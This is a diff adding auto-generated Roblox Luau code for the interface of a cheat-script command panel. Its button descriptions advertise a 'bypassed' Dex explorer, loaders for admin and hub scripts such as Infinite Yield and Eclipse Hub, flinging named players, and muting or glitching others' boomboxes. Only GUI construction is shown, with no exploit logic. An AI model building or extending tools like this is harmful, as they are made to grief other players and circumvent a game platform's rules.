+G2L["7"]["Position"] = UDim2.new(0.02215, 0, 0.43697, 0);
+G2L["7"]["Name"] = [[Line]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output
+G2L["8"] = Instance.new("TextLabel", G2L["2"]);
+G2L["8"]["TextWrapped"] = true;
+G2L["8"]["ZIndex"] = 2147483647;
+G2L["8"]["BorderSizePixel"] = 0;
+G2L["8"]["TextSize"] = 14;
+G2L["8"]["TextScaled"] = true;
+G2L["8"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
+G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["8"]["BackgroundTransparency"] = 0.5;
+G2L["8"]["Size"] = UDim2.new(0.95253, 0, 0.42017, 0);
+G2L["8"]["Text"] = [[]];
+G2L["8"]["Name"] = [[Output]];
+G2L["8"]["Position"] = UDim2.new(0.02215, 0, 0.51261, 0);
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output.UIStroke
+G2L["9"] = Instance.new("UIStroke", G2L["8"]);
+G2L["9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["9"]["Color"] = Color3.fromRGB(0, 171, 255);
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output.UICorner
+G2L["a"] = Instance.new("UICorner", G2L["8"]);
+
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.UIDragDetector
+G2L["b"] = Instance.new("UIDragDetector", G2L["2"]);
+
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Main
+G2L["c"] = Instance.new("LocalScript", G2L["2"]);
+G2L["c"]["Name"] = [[Main]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame
+G2L["d"] = Instance.new("Frame", G2L["1"]);
+G2L["d"]["Visible"] = false;
+G2L["d"]["ZIndex"] = 2147483647;
+G2L["d"]["BackgroundColor3"] = Color3.fromRGB(48, 48, 48);
+G2L["d"]["Size"] = UDim2.new(0.1965, 0, 0.41798, 0);
+G2L["d"]["Position"] = UDim2.new(0.09118, 0, 0.33139, 0);
+G2L["d"]["Name"] = [[CmdFrame]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.UICorner
+G2L["e"] = Instance.new("UICorner", G2L["d"]);
+
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Title
+G2L["f"] = Instance.new("TextLabel", G2L["d"]);
+G2L["f"]["TextWrapped"] = true;
+G2L["f"]["ZIndex"] = 2147483647;
+G2L["f"]["TextSize"] = 14;
+G2L["f"]["TextScaled"] = true;
+G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["f"]["BackgroundTransparency"] = 1;
+G2L["f"]["Size"] = UDim2.new(0.91905, 0, 0.1283, 0);
+G2L["f"]["Text"] = [[E Commands List]];
+G2L["f"]["Name"] = [[Title]];
+G2L["f"]["Position"] = UDim2.new(0.04286, 0, 0, 0);
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame
+G2L["10"] = Instance.new("Frame", G2L["d"]);
+G2L["10"]["ZIndex"] = 2147483647;
+G2L["10"]["BorderSizePixel"] = 0;
+G2L["10"]["BackgroundColor3"] = Color3.fromRGB(39, 39, 39);
+G2L["10"]["Size"] = UDim2.new(0.94056, 0, 0.79623, 0);
+G2L["10"]["Position"] = UDim2.new(0.03165, 0, 0.16912, 0);
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll
+G2L["11"] = Instance.new("ScrollingFrame", G2L["10"]);
+G2L["11"]["Active"] = true;
+G2L["11"]["ZIndex"] = 2147483647;
+G2L["11"]["BorderSizePixel"] = 0;
+G2L["11"]["CanvasSize"] = UDim2.new(0, 0, 30, 0);
+G2L["11"]["BackgroundColor3"] = Color3.fromRGB(39, 39, 39);
+G2L["11"]["Name"] = [[CmdScroll]];
+G2L["11"]["Size"] = UDim2.new(1, 0, 0.99687, 0);
+G2L["11"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11"]["Position"] = UDim2.new(0, 0, 0.00313, 0);
+G2L["11"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.UIListLayout
+G2L["12"] = Instance.new("UIListLayout", G2L["11"]);
+
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >dex
+G2L["13"] = Instance.new("TextButton", G2L["11"]);
+G2L["13"]["TextWrapped"] = true;
+G2L["13"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["13"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["13"]["TextSize"] = 14;
+G2L["13"]["TextScaled"] = true;
+G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["13"]["ZIndex"] = 2147483647;
+G2L["13"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["13"]["BackgroundTransparency"] = 1;
+G2L["13"]["Name"] = [[ >dex]];
+G2L["13"]["Text"] = [[ >dex]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >dex.Info
+G2L["14"] = Instance.new("StringValue", G2L["13"]);
+G2L["14"]["Name"] = [[Info]];
+G2L["14"]["Value"] = [[Command Info: Dex let's you see every instance in the game. (well not every idk why I said every) (some executors may crash when loading this idk for sure though since this is the bypassed version which uses a ton of methods)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >punch
+G2L["15"] = Instance.new("TextButton", G2L["11"]);
+G2L["15"]["TextWrapped"] = true;
+G2L["15"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["15"]["TextSize"] = 14;
+G2L["15"]["TextScaled"] = true;
+G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["15"]["ZIndex"] = 2147483647;
+G2L["15"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["15"]["BackgroundTransparency"] = 1;
+G2L["15"]["Name"] = [[ >punch]];
+G2L["15"]["Text"] = [[ >punch]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >punch.Info
+G2L["16"] = Instance.new("StringValue", G2L["15"]);
+G2L["16"]["Name"] = [[Info]];
+G2L["16"]["Value"] = [[Command Info: Press K to punch. (It flings people + no cooldown) (Mobile users should use a mobile keyboard script)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iy
+G2L["17"] = Instance.new("TextButton", G2L["11"]);
+G2L["17"]["TextWrapped"] = true;
+G2L["17"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["17"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["17"]["TextSize"] = 14;
+G2L["17"]["TextScaled"] = true;
+G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17"]["ZIndex"] = 2147483647;
+G2L["17"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["17"]["BackgroundTransparency"] = 1;
+G2L["17"]["Name"] = [[ >iy]];
+G2L["17"]["Text"] = [[ >iy]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iy.Info
+G2L["18"] = Instance.new("StringValue", G2L["17"]);
+G2L["18"]["Name"] = [[Info]];
+G2L["18"]["Value"] = [[Command Info: Executes the popular admin script, Infinite Yield.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmdx
+G2L["19"] = Instance.new("TextButton", G2L["11"]);
+G2L["19"]["TextWrapped"] = true;
+G2L["19"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["19"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["19"]["TextSize"] = 14;
+G2L["19"]["TextScaled"] = true;
+G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["19"]["ZIndex"] = 2147483647;
+G2L["19"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["19"]["BackgroundTransparency"] = 1;
+G2L["19"]["Name"] = [[ >cmdx]];
+G2L["19"]["Text"] = [[ >cmdx]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmdx.Info
+G2L["1a"] = Instance.new("StringValue", G2L["19"]);
+G2L["1a"]["Name"] = [[Info]];
+G2L["1a"]["Value"] = [[Command Info: Another popular admin script called CMD X.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmds
+G2L["1b"] = Instance.new("TextButton", G2L["11"]);
+G2L["1b"]["TextWrapped"] = true;
+G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["1b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1b"]["TextSize"] = 14;
+G2L["1b"]["TextScaled"] = true;
+G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1b"]["ZIndex"] = 2147483647;
+G2L["1b"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["1b"]["BackgroundTransparency"] = 1;
+G2L["1b"]["Name"] = [[ >cmds]];
+G2L["1b"]["Text"] = [[ >cmds]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmds.Info
+G2L["1c"] = Instance.new("StringValue", G2L["1b"]);
+G2L["1c"]["Name"] = [[Info]];
+G2L["1c"]["Value"] = [[Command Info: Opens the Commands List]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >uncmds
+G2L["1d"] = Instance.new("TextButton", G2L["11"]);
+G2L["1d"]["TextWrapped"] = true;
+G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["1d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1d"]["TextSize"] = 14;
+G2L["1d"]["TextScaled"] = true;
+G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1d"]["ZIndex"] = 2147483647;
+G2L["1d"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["1d"]["BackgroundTransparency"] = 1;
+G2L["1d"]["Name"] = [[ >uncmds]];
+G2L["1d"]["Text"] = [[ >uncmds]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >uncmds.Info
+G2L["1e"] = Instance.new("StringValue", G2L["1d"]);
+G2L["1e"]["Name"] = [[Info]];
+G2L["1e"]["Value"] = [[Command Info: Closes the Command List]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spinfling
+G2L["1f"] = Instance.new("TextButton", G2L["11"]);
+G2L["1f"]["TextWrapped"] = true;
+G2L["1f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["1f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1f"]["TextSize"] = 14;
+G2L["1f"]["TextScaled"] = true;
+G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1f"]["ZIndex"] = 2147483647;
+G2L["1f"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["1f"]["BackgroundTransparency"] = 1;
+G2L["1f"]["Name"] = [[ >spinfling]];
+G2L["1f"]["Text"] = [[ >spinfling]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spinfling.Info
+G2L["20"] = Instance.new("StringValue", G2L["1f"]);
+G2L["20"]["Name"] = [[Info]];
+G2L["20"]["Value"] = [[Command Info: Spins you very fast with velocity that you fling people.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspinfling
+G2L["21"] = Instance.new("TextButton", G2L["11"]);
+G2L["21"]["TextWrapped"] = true;
+G2L["21"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["21"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["21"]["TextSize"] = 14;
+G2L["21"]["TextScaled"] = true;
+G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["21"]["ZIndex"] = 2147483647;
+G2L["21"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["21"]["BackgroundTransparency"] = 1;
+G2L["21"]["Name"] = [[ >unspinfling]];
+G2L["21"]["Text"] = [[ >unspinfling]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspinfling.Info
+G2L["22"] = Instance.new("StringValue", G2L["21"]);
+G2L["22"]["Name"] = [[Info]];
+G2L["22"]["Value"] = [[Command Info: This turns off Spin Fling]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fling/<player name>
+G2L["23"] = Instance.new("TextButton", G2L["11"]);
+G2L["23"]["TextWrapped"] = true;
+G2L["23"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["23"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["23"]["TextSize"] = 14;
+G2L["23"]["TextScaled"] = true;
+G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["23"]["ZIndex"] = 2147483647;
+G2L["23"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["23"]["BackgroundTransparency"] = 1;
+G2L["23"]["Name"] = [[ >fling/<player name>]];
+G2L["23"]["Text"] = [[ >fling/<player name>]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fling/<player name>.Info
+G2L["24"] = Instance.new("StringValue", G2L["23"]);
+G2L["24"]["Name"] = [[Info]];
+G2L["24"]["Value"] = [[Command Info: Does not require a tool unlike others.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclipfling/<player name>
+G2L["25"] = Instance.new("TextButton", G2L["11"]);
+G2L["25"]["TextWrapped"] = true;
+G2L["25"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["25"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["25"]["TextSize"] = 14;
+G2L["25"]["TextScaled"] = true;
+G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["25"]["ZIndex"] = 2147483647;
+G2L["25"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["25"]["BackgroundTransparency"] = 1;
+G2L["25"]["Name"] = [[ >noclipfling/<player name>]];
+G2L["25"]["Text"] = [[ >noclipfling/<player name>]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclipfling/<player name>.Info
+G2L["26"] = Instance.new("StringValue", G2L["25"]);
+G2L["26"]["Name"] = [[Info]];
+G2L["26"]["Value"] = [[Command Info: Flings people who have noclip on. (not anti fling)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >expandchat
+G2L["27"] = Instance.new("TextButton", G2L["11"]);
+G2L["27"]["TextWrapped"] = true;
+G2L["27"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["27"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["27"]["TextSize"] = 14;
+G2L["27"]["TextScaled"] = true;
+G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["27"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["27"]["ZIndex"] = 2147483647;
+G2L["27"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["27"]["BackgroundTransparency"] = 1;
+G2L["27"]["Name"] = [[ >expandchat]];
+G2L["27"]["Text"] = [[ >expandchat]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >expandchat.Info
+G2L["28"] = Instance.new("StringValue", G2L["27"]);
+G2L["28"]["Name"] = [[Info]];
+G2L["28"]["Value"] = [[Command Info: Let's you be able to resize the chat + drag it.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>unglitchaudio
+G2L["29"] = Instance.new("TextButton", G2L["11"]);
+G2L["29"]["TextWrapped"] = true;
+G2L["29"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["29"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["29"]["TextSize"] = 14;
+G2L["29"]["TextScaled"] = true;
+G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["29"]["ZIndex"] = 2147483647;
+G2L["29"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["29"]["BackgroundTransparency"] = 1;
+G2L["29"]["Name"] = [[>unglitchaudio]];
+G2L["29"]["Text"] = [[>unglitchaudio]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>unglitchaudio.Info
+G2L["2a"] = Instance.new("StringValue", G2L["29"]);
+G2L["2a"]["Name"] = [[Info]];
+G2L["2a"]["Value"] = [[Command Info: Added the missing command for disabling glitched boombox on everyone]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >eclipsehub/<Premium key or 'nil'>
+G2L["2b"] = Instance.new("TextButton", G2L["11"]);
+G2L["2b"]["TextWrapped"] = true;
+G2L["2b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["2b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["2b"]["TextSize"] = 14;
+G2L["2b"]["TextScaled"] = true;
+G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2b"]["ZIndex"] = 2147483647;
+G2L["2b"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["2b"]["BackgroundTransparency"] = 1;
+G2L["2b"]["Name"] = [[ >eclipsehub/<Premium key or 'nil'>]];
+G2L["2b"]["Text"] = [[ >eclipsehub/<Premium key or 'nil'>]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >eclipsehub/<Premium key or 'nil'>.Info
+G2L["2c"] = Instance.new("StringValue", G2L["2b"]);
+G2L["2c"]["Name"] = [[Info]];
+G2L["2c"]["Value"] = [[Command Info: Eclipse Hub has a lot for Murder Mystery 2 which is what I mostly use it for. (optional premium key argument BUT you have to put 'nil' if you don't have one)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >muteradio/<player name>
+G2L["2d"] = Instance.new("TextButton", G2L["11"]);
+G2L["2d"]["TextWrapped"] = true;
+G2L["2d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["2d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["2d"]["TextSize"] = 14;
+G2L["2d"]["TextScaled"] = true;
+G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2d"]["ZIndex"] = 2147483647;
+G2L["2d"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["2d"]["BackgroundTransparency"] = 1;
+G2L["2d"]["Name"] = [[ >muteradio/<player name>]];
+G2L["2d"]["Text"] = [[ >muteradio/<player name>]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >muteradio/<player name>.Info
+G2L["2e"] = Instance.new("StringValue", G2L["2d"]);
+G2L["2e"]["Name"] = [[Info]];
+G2L["2e"]["Value"] = [[Command Info: Mutes someone boombox temporarily. (More info once command is used in output box)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >loopmuteradio/<player name>
+G2L["2f"] = Instance.new("TextButton", G2L["11"]);
+G2L["2f"]["TextWrapped"] = true;
+G2L["2f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["2f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["2f"]["TextSize"] = 14;
+G2L["2f"]["TextScaled"] = true;
+G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f"]["ZIndex"] = 2147483647;
+G2L["2f"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["2f"]["BackgroundTransparency"] = 1;
+G2L["2f"]["Name"] = [[ >loopmuteradio/<player name>]];
+G2L["2f"]["Text"] = [[ >loopmuteradio/<player name>]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >loopmuteradio/<player name>.Info
+G2L["30"] = Instance.new("StringValue", G2L["2f"]);
+G2L["30"]["Name"] = [[Info]];
+G2L["30"]["Value"] = [[Command Info: Loop mutes someones boombox. (extra info once executed from output box)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unloopmuteradio
+G2L["31"] = Instance.new("TextButton", G2L["11"]);
+G2L["31"]["TextWrapped"] = true;
+G2L["31"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["31"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["31"]["TextSize"] = 14;
+G2L["31"]["TextScaled"] = true;
+G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["31"]["ZIndex"] = 2147483647;
+G2L["31"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["31"]["BackgroundTransparency"] = 1;
+G2L["31"]["Name"] = [[ >unloopmuteradio]];
+G2L["31"]["Text"] = [[ >unloopmuteradio]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unloopmuteradio.Info
+G2L["32"] = Instance.new("StringValue", G2L["31"]);
+G2L["32"]["Name"] = [[Info]];
+G2L["32"]["Value"] = [[Command Info: Turns off Loop Mute for all the people who were affected.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >glitchradio/<player name>
+G2L["33"] = Instance.new("TextButton", G2L["11"]);
+G2L["33"]["TextWrapped"] = true;
+G2L["33"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["33"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["33"]["TextSize"] = 14;
+G2L["33"]["TextScaled"] = true;
+G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
